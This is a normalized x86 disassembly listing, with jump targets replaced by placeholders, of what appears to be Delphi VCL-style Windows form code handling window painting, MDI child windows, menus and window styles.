push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_44d0ac
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_4678f0
pop esi
pop ebx
retn
sub_4667fc
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_466855
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46685c
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
sub_466864
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d060
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_450fe0
mov eax ebx
call sub_45117c
sub_46689c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_420bc4
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_4668dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45149c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40338c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_40338c
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44e340
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_4609f8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_467208
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_466b55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_466b38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_424a8c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42492c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_461ee0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466b3f
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424a8c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_4609f8
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_467208
call sub_453a88
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_466c83
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_466c5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_466c3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_424a8c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42492c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c46
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424a8c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_453a88
mov esi eax
sub_466c63
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ReleaseDC
retn
sub_466d14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_466d60
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46723c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_467288
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_466da0
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_466f6e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424240
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45173c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_44ccd0
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44bac8
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_466d14
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424240
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_46723c
test eax eax
je r-xdata
push ebp
call sub_466d14
pop ecx
push ebp
call sub_466d14
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_466d60
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_464078
jmp r-xdata
sub_466f80
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_465248
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_466fec
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_4658e4
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax ebx
call sub_420d78
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_453a88
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_4508ac
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_453a88
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_420d4c
call sub_46153c
mov edx esi
mov eax ebx
call sub_420d4c
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
sub_467084
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_467101
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_46710c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_451028
sub_467138
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_451028
xor edx edx
jmp r-xdata
mov eax esi
call sub_4653c4
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_467170
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_44c990
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_451028
sub_4671b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44ca9c
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_467208
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_44a018
sub_46723c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46adac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_46ad98
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_467288
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46adac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46ad98
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4672d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_418314
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_467308
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_453a88
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_46ad7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_46ad7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_4672d8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_46ad7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46ad68
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_418470
call sub_403190
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46ad68
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46ad68
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46ad68
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_46740c
push ebx
mov ebx eax
mov eax ebx
call sub_467404
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_429ff4
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_467434
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_450fe0
mov dl 0x1
mov eax esi
call sub_467798
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_467814
mov edx eax
mov eax esi
call sub_44d32c
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_45117c
mov dl 0x1
mov eax esi
call sub_4667b8
sub_4674b4
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_453a88
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_45db38
mov edi eax
mov eax ebp
call sub_453a88
push eax
call DrawMenuBar
sub_467530
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_420824
xor edx edx
mov eax ebx
call sub_45f4d0
sub_467554
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_4674b4
mov eax edx
mov edx ebx
call sub_420824
sub_46757c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467742
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46adac
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_461084
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ad98
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_420824
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ad98
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
mov eax ebx
call sub_453d8c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_453a88
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4674b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467749
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
mov dl 0x1
mov eax ebx
call sub_468640
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_453a88
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_453a88
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_453a88
mov edx eax
mov eax esi
call sub_461084
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_453a88
push eax
call SetMenu
sub_467764
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_467750
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_4677c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4677b4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_46782c
push ebx
mov ebx eax
mov eax ebx
call sub_4530a0
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_467814
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_467814
mov edx eax
mov eax ebx
call sub_44d32c
mov edx 0xff00000f
mov eax ebx
call sub_44d32c
pop ebx
retn
sub_4678b0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_453a88
push eax
call ShowWindow
sub_4678f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_467308
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_467308
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_46ad7c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46ad68
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_467308
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_46ad7c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46ad68
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa50
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa38
